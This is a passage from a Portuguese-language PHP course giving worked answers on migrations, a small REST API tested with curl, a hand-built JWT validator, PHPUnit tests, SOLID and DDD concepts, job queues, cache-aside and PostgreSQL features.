+<p>Escreva um executor de <em>migrations</em> que, dado um array de <em>migrations</em> nomeadas (<code>"001_cria_livros" =&gt; "CREATE TABLE ..."</code>), crie a tabela de controle se não existir, aplique <strong>só as pendentes</strong>, em ordem, cada uma numa transação, e registre o nome e a data. Rode-o duas vezes e mostre que a segunda não faz nada. Depois inclua uma <em>migration</em> com erro e mostre que ela não deixa o banco pela metade.</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+function migrar(PDO $pdo, array $migrations): void
+{
+    $pdo-&gt;exec("CREATE TABLE IF NOT EXISTS migrations (nome TEXT PRIMARY KEY, aplicada_em TEXT NOT NULL)");
+    $aplicadas = $pdo-&gt;query("SELECT nome FROM migrations")-&gt;fetchAll(PDO::FETCH_COLUMN);
+    ksort($migrations);  // a ordem vem do prefixo numérico do nome
+
+    foreach ($migrations as $nome =&gt; $sql) {
+        if (in_array($nome, $aplicadas, true)) {
+            continue;
+        }
+        $pdo-&gt;beginTransaction();
+        try {
+            $pdo-&gt;exec($sql);
+            $pdo-&gt;prepare("INSERT INTO migrations VALUES (?, ?)")-&gt;execute([$nome, "2026-10-20"]);
+            $pdo-&gt;commit();
+            echo "  aplicada: $nome\n";
+        } catch (PDOException $e) {
+            $pdo-&gt;rollBack();
+            echo "  FALHOU: $nome ({$e-&gt;getMessage()}); nada dela ficou no banco\n";
+            return;  // as seguintes podem depender desta: para aqui
+        }
+    }
+}
+
+$pdo = new PDO("sqlite::memory:", options: [PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION]);
+$migrations = [
+    "002_adiciona_isbn" =&gt; "ALTER TABLE livros ADD COLUMN isbn TEXT",
+    "001_cria_livros" =&gt; "CREATE TABLE livros (id INTEGER PRIMARY KEY, titulo TEXT NOT NULL)",
+];
+
+echo "primeira execução:\n";
+migrar($pdo, $migrations);
+echo "segunda execução:\n";
+migrar($pdo, $migrations);
+echo "  (nada pendente)\n";
+
+$migrations["003_cria_autores"] = "CREATE TABLE autores (id INTEGER PRIMARY KEY); INSERT INTO tabela_que_nao_existe VALUES (1);";
+echo "terceira execução:\n";
+migrar($pdo, $migrations);
+
+$tabelas = $pdo-&gt;query("SELECT name FROM sqlite_master WHERE type = 'table' ORDER BY name")-&gt;fetchAll(PDO::FETCH_COLUMN);
+echo "tabelas: ", implode(", ", $tabelas), "\n";</code></pre>
+<pre class="saida"><code>primeira execução:
+  aplicada: 001_cria_livros
+  aplicada: 002_adiciona_isbn
+segunda execução:
+  (nada pendente)
+terceira execução:
+  FALHOU: 003_cria_autores (SQLSTATE[HY000]: General error: 1 no such table: tabela_que_nao_existe); nada dela ficou no banco
+tabelas: livros, migrations</code></pre>
+<p>A tabela <code>autores</code> <strong>não</strong> existe no fim: o <code>CREATE TABLE</code> dela rodou, mas o <code>rollBack</code> o desfez junto com o <code>INSERT</code> que falhou. O SQLite e o PostgreSQL têm DDL transacional; o <strong>MySQL não</strong>: lá, cada <code>CREATE</code> e <code>ALTER</code> confirma a transação sozinho (<em>implicit commit</em>), e uma <em>migration</em> que falha no meio deixa o banco pela metade. Por isso, no MySQL, cada <em>migration</em> deve fazer uma única alteração de esquema.</p>
+<div class="questao" id="q35">
+<span class="num">Q35</span>
+<div class="corpo">
+<p class="titulo">Uma API REST com o servidor embutido</p>
+<p>Escreva <code>api.php</code>, um roteador para o servidor embutido do PHP (<code>php -S</code>) com <code>GET /livros</code>, <code>GET /livros/{id}</code> (404 quando não existe) e <code>POST /livros</code> (201 com <code>Location</code>, ou 422 com os erros de validação, ou 400 para JSON malformado), guardando os livros num arquivo JSON. Teste com <code>curl</code>.</p>
+</div>
+</div>
+<p><code>api.php</code>:</p>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+const ARQUIVO = __DIR__ . '/livros.json';
+
+function responder(int $status, mixed $corpo = null, array $cabecalhos = []): never
+{
+    http_response_code($status);
+    header('Content-Type: application/json; charset=utf-8');
+    foreach ($cabecalhos as $nome =&gt; $valor) {
+        header("$nome: $valor");
+    }
+    if ($corpo !== null) {
+        echo json_encode($corpo, JSON_UNESCAPED_UNICODE);
+    }
+    exit;
+}
+
+$livros = is_file(ARQUIVO) ? json_decode(file_get_contents(ARQUIVO), true) : [];
+$metodo = $_SERVER['REQUEST_METHOD'];
+$caminho = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+
+if ($metodo === 'GET' &amp;&amp; $caminho === '/livros') {
+    responder(200, array_values($livros));
+}
+
+if ($metodo === 'GET' &amp;&amp; preg_match('#^/livros/(\d+)$#', $caminho, $m)) {
+    $livro = $livros[$m[1]] ?? null;
+    $livro ? responder(200, $livro) : responder(404, ['erro' =&gt; 'livro não encontrado']);
+}
+
+if ($metodo === 'POST' &amp;&amp; $caminho === '/livros') {
+    try {
+        $dados = json_decode(file_get_contents('php://input'), true, flags: JSON_THROW_ON_ERROR);
+    } catch (JsonException) {
+        responder(400, ['erro' =&gt; 'JSON malformado']);
+    }
+    $erros = [];
+    if (!is_string($dados['titulo'] ?? null) || trim($dados['titulo']) === '') {
+        $erros['titulo'] = 'obrigatório';
+    }
+    if (!is_int($dados['precoCentavos'] ?? null) || $dados['precoCentavos'] &lt;= 0) {
+        $erros['precoCentavos'] = 'inteiro positivo';
+    }
+    if ($erros) {
+        responder(422, ['erros' =&gt; $erros]);
+    }
+    $id = $livros ? max(array_keys($livros)) + 1 : 1;
+    $livros[$id] = ['id' =&gt; $id, 'titulo' =&gt; trim($dados['titulo']), 'precoCentavos' =&gt; $dados['precoCentavos']];
+    file_put_contents(ARQUIVO, json_encode($livros, JSON_UNESCAPED_UNICODE), LOCK_EX);
+    responder(201, $livros[$id], ['Location' =&gt; "/livros/$id"]);
+}
+
+responder(404, ['erro' =&gt; 'rota não encontrada']);</code></pre>
+<pre class="codigo"><code>php -S 127.0.0.1:8791 api.php &gt;/dev/null 2&gt;&amp;1 &amp;
+servidor=$!
+sleep 1
+url=http://127.0.0.1:8791
+pedir() { curl -s -w "  -&gt; %{http_code}\n" "$@"; }
+
+pedir -X POST -d '{"titulo": "Vidas Secas", "precoCentavos": 4990}' $url/livros
+curl -s -o /dev/null -D - -X POST -d '{"titulo": "Iracema", "precoCentavos": 2500}' $url/livros | grep -i '^location'
+pedir -X POST -d '{"titulo": "", "precoCentavos": -1}' $url/livros
+pedir -X POST -d '{"titulo": ' $url/livros
+pedir $url/livros
+pedir $url/livros/2
+pedir $url/livros/99
+kill $servidor</code></pre>
+<pre class="saida"><code>{"id":1,"titulo":"Vidas Secas","precoCentavos":4990}  -&gt; 201
+Location: /livros/2
+{"erros":{"titulo":"obrigatório","precoCentavos":"inteiro positivo"}}  -&gt; 422
+{"erro":"JSON malformado"}  -&gt; 400
+[{"id":1,"titulo":"Vidas Secas","precoCentavos":4990},{"id":2,"titulo":"Iracema","precoCentavos":2500}]  -&gt; 200
+{"id":2,"titulo":"Iracema","precoCentavos":2500}  -&gt; 200
+{"erro":"livro não encontrado"}  -&gt; 404</code></pre>
+<p>O tipo de retorno <code>never</code> (PHP 8.1) documenta que <code>responder</code> não volta: ela sempre termina com <code>exit</code>, o que dispensa os <code>return</code> depois de cada chamada. O <code>JSON_UNESCAPED_UNICODE</code> grava "Iracema" e os acentos como estão, em vez de <code>\u00e7</code>. O <code>LOCK_EX</code> evita que duas requisições simultâneas misturem as gravações, mas ainda há corrida entre ler e gravar o arquivo (as duas leem, as duas gravam, uma inclusão se perde): é aqui que um banco de dados com transações deixa de ser opcional. O servidor embutido é só para desenvolvimento: atende uma requisição por vez.</p>
+<div class="questao" id="q36">
+<span class="num">Q36</span>
+<div class="corpo">
+<p class="titulo">JWT feito à mão</p>
+<p>Para entender o formato, implemente <code>jwt_criar(array $claims, string $segredo): string</code> e <code>jwt_validar(string $token, string $segredo, int $agora): array</code> com HS256, usando <code>hash_hmac</code> e Base64Url. A validação deve recusar assinatura inválida, <em>token</em> expirado (<code>exp</code>) e algoritmo diferente de HS256. Teste um <em>token</em> válido, um alterado e um expirado. (Em produção, use uma biblioteca como <code>firebase/php-jwt</code>.)</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+function b64url(string $s): string { return rtrim(strtr(base64_encode($s), '+/', '-_'), '='); }
+function b64url_dec(string $s): string { return base64_decode(strtr($s, '-_', '+/'), true) ?: ''; }
+
+function jwt_criar(array $claims, string $segredo): string
+{
+    $cab = b64url(json_encode(['alg' =&gt; 'HS256', 'typ' =&gt; 'JWT']));
+    $corpo = b64url(json_encode($claims));
+    $assinatura = b64url(hash_hmac('sha256', "$cab.$corpo", $segredo, true));
+    return "$cab.$corpo.$assinatura";
+}
+
+function jwt_validar(string $token, string $segredo, int $agora): array
+{
+    $partes = explode('.', $token);
+    if (count($partes) !== 3) {
+        throw new UnexpectedValueException('formato inválido');
+    }
+    [$cab, $corpo, $assinatura] = $partes;
+    $cabecalho = json_decode(b64url_dec($cab), true);
+    if (($cabecalho['alg'] ?? null) !== 'HS256') {
+        throw new UnexpectedValueException('algoritmo não aceito');  // nunca confie no "alg" do token
+    }
+    $esperada = b64url(hash_hmac('sha256', "$cab.$corpo", $segredo, true));
+    if (!hash_equals($esperada, $assinatura)) {
+        throw new UnexpectedValueException('assinatura inválida');
+    }
+    $claims = json_decode(b64url_dec($corpo), true);
+    if (($claims['exp'] ?? 0) &lt;= $agora) {
+        throw new UnexpectedValueException('token expirado');
+    }
+    return $claims;
+}
+
+$segredo = 'troque-por-um-segredo-longo-e-aleatorio';
+$agora = 1_790_000_000;
+$token = jwt_criar(['sub' =&gt; '42', 'role' =&gt; 'editor', 'exp' =&gt; $agora + 900], $segredo);
+echo "token: ", substr($token, 0, 40), "...\n";
+echo "payload legível por qualquer um: ", b64url_dec(explode('.', $token)[1]), "\n";
+
+[$c, , $s] = explode('.', $token);
+$adulterado = "$c." . b64url(json_encode(['sub' =&gt; '42', 'role' =&gt; 'admin', 'exp' =&gt; $agora + 900])) . ".$s";
+
+foreach (['válido' =&gt; [$token, $agora], 'adulterado' =&gt; [$adulterado, $agora], 'depois de 15 min' =&gt; [$token, $agora + 901]] as $caso =&gt; [$t, $quando]) {
+    try {
+        $claims = jwt_validar($t, $segredo, $quando);
+        echo "$caso: ok, usuário {$claims['sub']} ({$claims['role']})\n";
+    } catch (UnexpectedValueException $e) {
+        echo "$caso: recusado, {$e-&gt;getMessage()}\n";
+    }
+}</code></pre>
+<pre class="saida"><code>token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ...
+payload legível por qualquer um: {"sub":"42","role":"editor","exp":1790000900}
+válido: ok, usuário 42 (editor)
+adulterado: recusado, assinatura inválida
+depois de 15 min: recusado, token expirado</code></pre>
+<p>A segunda linha da saída é o ponto principal: o <em>payload</em> é só Base64, e qualquer um o lê. O atacante pode até trocar <code>editor</code> por <code>admin</code>, mas não consegue refazer a assinatura sem o segredo. O <code>hash_equals</code> compara em tempo constante, sem dar pistas por diferença de tempo. Conferir o <code>alg</code> evita um ataque clássico: <em>tokens</em> com <code>"alg": "none"</code>, que bibliotecas antigas aceitavam sem assinatura. O "agora" é parâmetro pelo mesmo motivo da trait de <em>timestamps</em>: com <code>time()</code> dentro da função, o teste de expiração dependeria do relógio.</p>
+<div class="questao" id="q37">
+<span class="num">Q37</span>
+<div class="corpo">
+<p class="titulo">Testes com PHPUnit</p>
+<p>Escreva, como projeto com Composer e PHPUnit 12, testes para a classe <code>Conta</code> do módulo 2: um teste do depósito, um teste que espera a exceção do saque acima do saldo e um teste com <em>data provider</em> (atributo <code>#[DataProvider]</code>) para valores inválidos de depósito.</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+use PHPUnit\Framework\Attributes\DataProvider;
+use PHPUnit\Framework\Attributes\Test;
+use PHPUnit\Framework\TestCase;
+
+final class ContaTest extends TestCase
+{
+    #[Test]
+    public function deposito_aumenta_o_saldo(): void
+    {
+        $conta = new Conta('Ana');
+
+        $conta-&gt;depositar(1_000);
+
+        self::assertSame(1_000, $conta-&gt;saldoCentavos);
+    }
+
+    #[Test]
+    public function saque_acima_do_saldo_e_recusado(): void
+    {
+        $conta = new Conta('Ana');
+        $conta-&gt;depositar(500);
+
+        $this-&gt;expectException(DomainException::class);
+        $this-&gt;expectExceptionMessage('saldo insuficiente');
+
+        $conta-&gt;sacar(501);
+    }
+
+    #[Test]
+    #[DataProvider('depositosInvalidos')]
+    public function deposito_nao_positivo_e_recusado(int $valor): void
+    {
+        $this-&gt;expectException(InvalidArgumentException::class);
+
+        (new Conta('Ana'))-&gt;depositar($valor);
+    }
+
+    public static function depositosInvalidos(): iterable
+    {
+        yield 'zero' =&gt; [0];
+        yield 'negativo' =&gt; [-1];
+        yield 'muito negativo' =&gt; [PHP_INT_MIN];
+    }
+}</code></pre>
+<p>Instale com <code>composer require --dev phpunit/phpunit:^12</code> e rode com <code>vendor/bin/phpunit tests</code>. Com a classe <code>Conta</code> em <code>src/Conta.php</code>, carregada pelo <em>autoload</em> do Composer (<code>"autoload": {"classmap": ["src/"]}</code>), os cinco testes passam (três casos do <em>data provider</em> mais os dois testes simples; conferido com o PHPUnit 12.5). O nome de cada caso (<code>'zero'</code>, <code>'negativo'</code>) aparece no relatório quando um deles falha, o que vale mais que um índice numérico. O <code>expectException</code> precisa vir <strong>antes</strong> da linha que lança: depois dela, o teste já teria sido interrompido. No PHPUnit 10 em diante, <em>data providers</em> precisam ser <code>public static</code>, e as anotações em comentário (<code>@dataProvider</code>) deram lugar aos atributos.</p>
+</section>
+<section class="modulo" id="modulo-5">
+<h2><span class="rotulo">MÓDULO 5</span> Arquitetura e escala</h2>
+<p class="intro">SOLID na prática, Clean Architecture, Domain-Driven Design, filas e jobs assíncronos e cache com Redis.</p>
+<p class="aulas-titulo">Artigos 26 a 30</p>
+<ul class="aulas">
+<li><span class="n">#26</span> SOLID na Prática</li>
+<li><span class="n">#27</span> Clean Architecture com PHP</li>
+<li><span class="n">#28</span> Domain-Driven Design</li>
+<li><span class="n">#29</span> Filas e Jobs Assíncronos</li>
+<li><span class="n">#30</span> Cache Avançado com Redis</li>
+</ul>
+<h3>Perguntas conceituais — respostas</h3>
+<div class="questao" id="q38">
+<span class="num">Q38</span>
+<div class="corpo">
+<p class="titulo">Uma responsabilidade</p>
+<p>Esta classe tem quantas responsabilidades, segundo o princípio da responsabilidade única (SRP)? Como dividi-la?</p>
+<pre class="codigo"><code>class PedidoService {
+    public function finalizar(array $dados) {
+        // valida os dados, calcula o total com desconto e frete,
+        // grava no MySQL, gera o PDF da nota e envia o e-mail
+    }
+}</code></pre>
+</div>
+</div>
+<p>O SRP diz que uma classe deve ter <strong>um motivo para mudar</strong>. Aqui há pelo menos cinco: as regras de validação, as regras de preço (desconto e frete), a persistência (o MySQL), o formato da nota e o envio de e-mail. Uma mudança no layout da nota mexe na mesma classe que calcula o frete, e testar o desconto exige banco e servidor de e-mail. Divisão: <code>CalculadoraDePreco</code> (regras puras, fácil de testar), <code>PedidoRepository</code> (persistência), <code>GeradorDeNota</code> e <code>Notificador</code> (por interface, para trocar o e-mail por SMS). O <code>FinalizarPedido</code> passa a <strong>orquestrar</strong> esses colaboradores, recebidos pelo construtor, sem implementar nenhum deles.</p>
+<div class="questao" id="q39">
+<span class="num">Q39</span>
+<div class="corpo">
+<p class="titulo">Inversão de dependência</p>
+<p>O princípio da inversão de dependência (o "D" do SOLID) diz que módulos de alto nível não devem depender de módulos de baixo nível, mas de abstrações. Mostre o antes e o depois com um <code>RelatorioDeVendas</code> que hoje faz <code>new MySqlVendas()</code> dentro do construtor.</p>
+</div>
+</div>
+<p>Antes, a regra de negócio (alto nível) depende do detalhe (baixo nível):</p>
+<pre class="codigo"><code>class RelatorioDeVendas {
+    private MySqlVendas $vendas;
+    public function __construct() { $this-&gt;vendas = new MySqlVendas(); }
+}</code></pre>
+<p>Depois, os dois dependem de uma abstração, que pertence ao lado do negócio:</p>
+<pre class="codigo"><code>interface FonteDeVendas { public function doMes(int $ano, int $mes): array; }
+
+final class RelatorioDeVendas {
+    public function __construct(private FonteDeVendas $vendas) {}
+}
+
+final class MySqlVendas implements FonteDeVendas { /* ... */ }</code></pre>
+<p>O relatório pode ser testado com uma <code>FonteDeVendas</code> em memória, e trocar o MySQL pelo PostgreSQL (ou por uma API) não toca nele. Quem decide qual implementação usar é a "raiz de composição" da aplicação: o <code>bootstrap</code>, o contêiner de dependências.</p>
+<div class="questao" id="q40">
+<span class="num">Q40</span>
+<div class="corpo">
+<p class="titulo">Entidade, objeto de valor e agregado</p>
+<p>No DDD, qual a diferença entre uma <strong>entidade</strong> e um <strong>objeto de valor</strong>? O que é um <strong>agregado</strong>, e por que os itens de um pedido só devem ser alterados por meio do próprio <code>Pedido</code>?</p>
+</div>
+</div>
+<p>Uma <strong>entidade</strong> tem identidade que persiste ao longo do tempo, mesmo que os dados mudem: o pedido 123 continua sendo o 123 depois de pago. Um <strong>objeto de valor</strong> é definido só pelos seus atributos, é imutável e substituível: dois <code>Preco(4990, 'BRL')</code> são o mesmo preço. Um <strong>agregado</strong> é um grupo de objetos tratado como unidade de consistência, com uma entidade <strong>raiz</strong> como única porta de entrada: o <code>Pedido</code> e os seus <code>ItemPedido</code>. Se o código pudesse alterar um item diretamente, a regra "um pedido pago não muda" ou "o total sempre bate com os itens" poderia ser violada sem o pedido saber. Passando por <code>$pedido-&gt;adicionarItem(...)</code>, a raiz verifica as regras a cada alteração, e o repositório salva e carrega o agregado inteiro.</p>
+<div class="questao" id="q41">
+<span class="num">Q41</span>
+<div class="corpo">
+<p class="titulo">Por que uma fila</p>
+<p>Ao finalizar o pedido, a loja precisa gerar a nota fiscal (3 s, num serviço externo) e enviar o e-mail (1 s). Por que fazer isso numa fila, processada por um <em>worker</em>, em vez de durante a requisição? O que é uma <em>dead letter queue</em>?</p>
+</div>
+</div>
+<p>Na requisição, o cliente esperaria pelo menos 4 s olhando para a tela, e uma falha do serviço de notas (fora do ar, lento) derrubaria a finalização do pedido, que já tinha sido paga. Com a fila, a requisição grava o pedido, enfileira os <em>jobs</em> e responde em milissegundos; o <em>worker</em> processa no seu ritmo, e uma falha vira uma <strong>nova tentativa</strong>, não um erro para o cliente. Picos de pedidos são absorvidos pela fila, sem derrubar o servidor web. A <em>dead letter queue</em> recebe os <em>jobs</em> que falharam mais vezes do que o limite: eles saem do fluxo normal para não serem tentados para sempre e ficam guardados para alguém investigar e reprocessar.</p>
+<div class="questao" id="q42">
+<span class="num">Q42</span>
+<div class="corpo">
+<p class="titulo">Cache-aside</p>
+<p>Descreva o padrão <em>cache-aside</em> com Redis para a página de um livro. O que acontece quando o preço muda, e por que o TTL é uma rede de segurança e não a estratégia principal?</p>
+</div>
+</div>
+<p>Na leitura: procura <code>livro:42</code> no Redis. Se existe (<em>hit</em>), usa; se não (<em>miss</em>), busca no banco, grava no Redis com um TTL e usa. A aplicação é responsável por encher o cache, daí o nome. Quando o preço muda, o código que grava no banco <strong>apaga</strong> a chave <code>livro:42</code> (é mais seguro apagar que atualizar: a próxima leitura busca o valor certo no banco). O TTL garante que, se algum caminho de escrita esquecer de invalidar, o dado velho tenha prazo para morrer. Mas, contando só com ele, o preço errado aparece até o TTL expirar, o que em loja pode significar vender pelo preço antigo.</p>
+<h3>Exercícios de código — respostas</h3>
+<div class="questao" id="q43">
+<span class="num">Q43</span>
+<div class="corpo">
+<p class="titulo">Uma fila de jobs com tentativas</p>
+<p>Implemente uma fila de <em>jobs</em> num SQLite em memória (tabela <code>jobs</code> com <code>tipo</code>, <code>dados</code>, <code>tentativas</code>, <code>status</code>) e um <em>worker</em> que processa os pendentes, tentando de novo os que falham até 3 vezes e mandando para <code>falhou</code> (a <em>dead letter</em>) os que esgotam as tentativas. Simule um <em>job</em> que sempre funciona, um que falha uma vez e depois funciona, e um que sempre falha.</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+$pdo = new PDO('sqlite::memory:', options: [PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC]);
+$pdo-&gt;exec("CREATE TABLE jobs (id INTEGER PRIMARY KEY, tipo TEXT, dados TEXT, tentativas INTEGER DEFAULT 0, status TEXT DEFAULT 'pendente')");
+
+function enfileirar(PDO $pdo, string $tipo, array $dados): void
+{
+    $pdo-&gt;prepare("INSERT INTO jobs (tipo, dados) VALUES (?, ?)")-&gt;execute([$tipo, json_encode($dados)]);
+}
+
+$falhasDaNota = 0;
+$handlers = [
+    'email' =&gt; fn(array $d) =&gt; print("    e-mail enviado para {$d['para']}\n"),
+    'nota' =&gt; function (array $d) use (&amp;$falhasDaNota) {
+        if ($falhasDaNota++ === 0) {
+            throw new RuntimeException('serviço de notas fora do ar');
+        }
+        print("    nota do pedido {$d['pedido']} gerada\n");
+    },
+    'estoque' =&gt; fn(array $d) =&gt; throw new RuntimeException('API de estoque recusou'),
+];
+
+function processar(PDO $pdo, array $handlers, int $maxTentativas = 3): int
+{
+    $jobs = $pdo-&gt;query("SELECT * FROM jobs WHERE status = 'pendente' ORDER BY id")-&gt;fetchAll();
+    foreach ($jobs as $job) {
+        try {
+            $handlers[$job['tipo']](json_decode($job['dados'], true));
+            $pdo-&gt;prepare("UPDATE jobs SET status = 'feito' WHERE id = ?")-&gt;execute([$job['id']]);
+        } catch (Throwable $e) {
+            $tentativas = $job['tentativas'] + 1;
+            $status = $tentativas &gt;= $maxTentativas ? 'falhou' : 'pendente';
+            $pdo-&gt;prepare("UPDATE jobs SET tentativas = ?, status = ? WHERE id = ?")-&gt;execute([$tentativas, $status, $job['id']]);
+            echo "    job {$job['id']} ({$job['tipo']}) falhou na tentativa $tentativas: {$e-&gt;getMessage()}\n";
+        }
+    }
+    return count($jobs);
+}
+
+enfileirar($pdo, 'email', ['para' =&gt; 'ana@exemplo.com']);
+enfileirar($pdo, 'nota', ['pedido' =&gt; 123]);
+enfileirar($pdo, 'estoque', ['livro' =&gt; 7]);
+
+for ($rodada = 1; ($n = processar($pdo, $handlers)) &gt; 0; $rodada++) {
+    echo "  rodada $rodada: $n job(s) examinados\n";
+}
+foreach ($pdo-&gt;query("SELECT id, tipo, tentativas, status FROM jobs") as $j) {
+    echo "job {$j['id']} {$j['tipo']}: {$j['status']} após {$j['tentativas']} falha(s)\n";
+}</code></pre>
+<pre class="saida"><code>    e-mail enviado para ana@exemplo.com
+    job 2 (nota) falhou na tentativa 1: serviço de notas fora do ar
+    job 3 (estoque) falhou na tentativa 1: API de estoque recusou
+  rodada 1: 3 job(s) examinados
+    nota do pedido 123 gerada
+    job 3 (estoque) falhou na tentativa 2: API de estoque recusou
+  rodada 2: 2 job(s) examinados
+    job 3 (estoque) falhou na tentativa 3: API de estoque recusou
+  rodada 3: 1 job(s) examinados
+job 1 email: feito após 0 falha(s)
+job 2 nota: feito após 1 falha(s)
+job 3 estoque: falhou após 3 falha(s)</code></pre>
+<p>As mensagens de cada rodada aparecem antes da linha "rodada N" porque são impressas durante o processamento. Num <em>worker</em> real, o laço não termina: ele dorme alguns segundos quando não há <em>jobs</em> e espera mais a cada falha de um mesmo <em>job</em> (<em>backoff</em>). Com mais de um <em>worker</em>, a seleção precisa <strong>reservar</strong> o <em>job</em> (<code>UPDATE ... SET status = 'processando' WHERE id = ? AND status = 'pendente'</code>, conferindo as linhas afetadas, ou <code>SELECT ... FOR UPDATE SKIP LOCKED</code> no MySQL 8 e no PostgreSQL), senão dois <em>workers</em> pegam o mesmo. É o que o Laravel Queue, o Symfony Messenger e afins fazem por você.</p>
+<div class="questao" id="q44">
+<span class="num">Q44</span>
+<div class="corpo">
+<p class="titulo">Cache-aside com interface</p>
+<p>Defina <code>interface Cache { get, set (com TTL), delete }</code>, uma implementação em memória que respeite o TTL com um relógio injetado, e um <code>LivroService</code> que use o padrão <em>cache-aside</em> sobre um repositório que conta as idas ao "banco". Mostre o <em>miss</em>, o <em>hit</em>, a invalidação na alteração de preço e a expiração pelo TTL.</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+interface Cache
+{
+    public function get(string $chave): mixed;
+    public function set(string $chave, mixed $valor, int $ttl): void;
+    public function delete(string $chave): void;
+}
+
+final class CacheEmMemoria implements Cache
+{
+    private array $itens = [];
+    public function __construct(private Closure $agora) {}
+    public function get(string $chave): mixed
+    {
+        [$valor, $expira] = $this-&gt;itens[$chave] ?? [null, 0];
+        return $expira &gt; ($this-&gt;agora)() ? $valor : null;
+    }
+    public function set(string $chave, mixed $valor, int $ttl): void
+    {
+        $this-&gt;itens[$chave] = [$valor, ($this-&gt;agora)() + $ttl];
+    }
+    public function delete(string $chave): void
+    {
+        unset($this-&gt;itens[$chave]);
+    }
+}
+
+final class BancoFalso
+{
+    public int $consultas = 0;
+    public array $precos = [42 =&gt; 4990];
+    public function preco(int $id): int { $this-&gt;consultas++; return $this-&gt;precos[$id]; }
+}
+
+final class LivroService
+{
+    public function __construct(private Cache $cache, private BancoFalso $banco) {}
+
+    public function preco(int $id): int
+    {
+        $chave = "livro:$id:preco";
+        $valor = $this-&gt;cache-&gt;get($chave);
+        if ($valor === null) {
+            $valor = $this-&gt;banco-&gt;preco($id);
+            $this-&gt;cache-&gt;set($chave, $valor, ttl: 300);
+        }
+        return $valor;
+    }
+
+    public function alterarPreco(int $id, int $novo): void
+    {
+        $this-&gt;banco-&gt;precos[$id] = $novo;
+        $this-&gt;cache-&gt;delete("livro:$id:preco");  // invalida: a próxima leitura busca o novo
+    }
+}
+
+$relogio = 1000;
+$banco = new BancoFalso();
+$svc = new LivroService(new CacheEmMemoria(function () use (&amp;$relogio) { return $relogio; }), $banco);
+
+$passos = [
+    'primeira leitura' =&gt; fn() =&gt; $svc-&gt;preco(42),
+    'segunda leitura' =&gt; fn() =&gt; $svc-&gt;preco(42),
+    'preço alterado, nova leitura' =&gt; function () use ($svc) { $svc-&gt;alterarPreco(42, 3990); return $svc-&gt;preco(42); },
+    'lida 2 min depois' =&gt; function () use ($svc, &amp;$relogio) { $relogio += 120; return $svc-&gt;preco(42); },
+    'lida 10 min depois' =&gt; function () use ($svc, &amp;$relogio) { $relogio += 480; return $svc-&gt;preco(42); },
+];
+foreach ($passos as $passo =&gt; $acao) {
+    $antes = $banco-&gt;consultas;
+    $preco = $acao();
+    printf("%s R$ %.2f (%s)\n", mb_str_pad($passo, 29), $preco / 100, $banco-&gt;consultas &gt; $antes ? 'banco' : 'cache');
+}</code></pre>
+<pre class="saida"><code>primeira leitura              R$ 49.90 (banco)
+segunda leitura               R$ 49.90 (cache)
+preço alterado, nova leitura  R$ 39.90 (banco)
+lida 2 min depois             R$ 39.90 (cache)
+lida 10 min depois            R$ 39.90 (banco)</code></pre>
+<p>Com Redis, só a classe do cache muda: <code>get</code> vira <code>$redis-&gt;get($chave)</code> (com <code>unserialize</code> ou <code>json_decode</code>), <code>set</code> vira <code>$redis-&gt;set($chave, $valor, ['EX' =&gt; $ttl])</code> e <code>delete</code> vira <code>$redis-&gt;del($chave)</code>; o <code>LivroService</code> não muda uma linha. O relógio injetado permitiu "avançar 10 minutos" sem esperar. Ele é uma função anônima com <code>use (&amp;$relogio)</code>, por <strong>referência</strong>: uma <em>arrow function</em> (<code>fn() =&gt; $relogio</code>) capturaria o valor de 1000 no momento da criação, o relógio do cache nunca andaria, e a última leitura viria do cache, um bug que a primeira versão deste exercício teve. Um detalhe do <em>cache-aside</em>: um preço <code>null</code> legítimo nunca ficaria em cache, porque <code>null</code> significa "não está no cache"; quando isso importa, guarda-se um marcador ou um array <code>['v' =&gt; null]</code>.</p>
+</section>
+<section class="modulo" id="modulo-6">
+<h2><span class="rotulo">MÓDULO 6</span> Outros bancos: PostgreSQL, SQLite e MongoDB</h2>
+<p class="intro">Os recursos próprios do PostgreSQL, o SQLite como banco de arquivo e o MongoDB com documentos.</p>
+<p class="aulas-titulo">Artigos 31 a 33</p>
+<ul class="aulas">
+<li><span class="n">#31</span> PostgreSQL com PHP</li>
+<li><span class="n">#32</span> SQLite com PHP</li>
+<li><span class="n">#33</span> MongoDB com PHP</li>
+</ul>
+<h3>Perguntas conceituais — respostas</h3>
+<div class="questao" id="q45">
+<span class="num">Q45</span>
+<div class="corpo">
+<p class="titulo">O que o PostgreSQL tem a mais</p>
+<p>Cite três recursos do PostgreSQL que o MySQL não tem ou tem de forma limitada, e um caso de uso de cada um numa livraria.</p>
+</div>
+</div>
+<ul><li>**<code>RETURNING</code>**: <code>INSERT INTO pedidos (...) VALUES (...) RETURNING id, criado_em</code> devolve as colunas geradas no mesmo comando, sem um <code>SELECT</code> a mais. Útil ao criar o pedido e já mostrar o número dele.</li><li><strong>JSONB com índices GIN</strong>: guardar atributos variáveis de produtos (dimensões de um livro, faixas de um disco) num campo <code>jsonb</code> e consultar <code>WHERE atributos @&gt; '{"capa": "dura"}'</code> com índice.</li><li><strong>Busca textual nativa</strong> (<code>tsvector</code>, <code>to_tsquery('portuguese', ...)</code>): busca por radicais ("livros" encontra "livro") e com ranking, sem um serviço externo.</li></ul>
+<p>Outros: tipos de array, CTEs recursivas (árvore de categorias), índices parciais (<code>WHERE ativo</code>), DDL transacional (visto nas <em>migrations</em>) e <code>ON CONFLICT</code> com mais opções que o <code>ON DUPLICATE KEY UPDATE</code>.</p>
+<div class="questao" id="q46">
+<span class="num">Q46</span>
+<div class="corpo">
+<p class="titulo">Quando o SQLite basta</p>
+<p>O SQLite é "só para testes"? Em que situações ele é a escolha certa em produção, e qual é a principal limitação dele?</p>
+</div>
+</div>
